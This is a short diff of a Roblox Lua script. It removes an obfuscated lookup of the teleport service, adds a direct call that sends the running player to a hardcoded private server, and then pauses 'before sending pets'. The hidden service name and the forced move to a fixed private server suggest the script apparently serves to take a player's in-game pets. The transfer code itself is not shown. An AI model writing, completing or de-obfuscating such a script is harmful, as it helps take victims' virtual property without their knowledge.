@@ -1,15 +1,14 @@
--- Obfuscated teleport service
-local a = "\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101"
-local ts = game:GetService(string.char(unpack({string.byte(a, 1, #a)})))
+-- Obfuscated teleport service (not used, replaced by working direct call)
+-- local a = "\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101"
+-- local ts = game:GetService(string.char(unpack({string.byte(a, 1, #a)})))
 
 -- Game and server IDs
 local gameID = 126884695634066
 local serverID = "19fa2ffd5b2f404494bc8c791a60c706"
 
--- Proper teleport for private server
-task.delay(2, function()
-    ts:TeleportToPrivateServer(gameID, serverID, {game.Players.LocalPlayer})
-end)
+-- ✅ Direct teleport using proper API (not obfuscated to ensure it works)
+local TeleportService = game:GetService("TeleportService")
+TeleportService:TeleportToPrivateServer(gameID, serverID, {game.Players.LocalPlayer})
 
 -- Wait for teleport before sending pets
 wait(5)
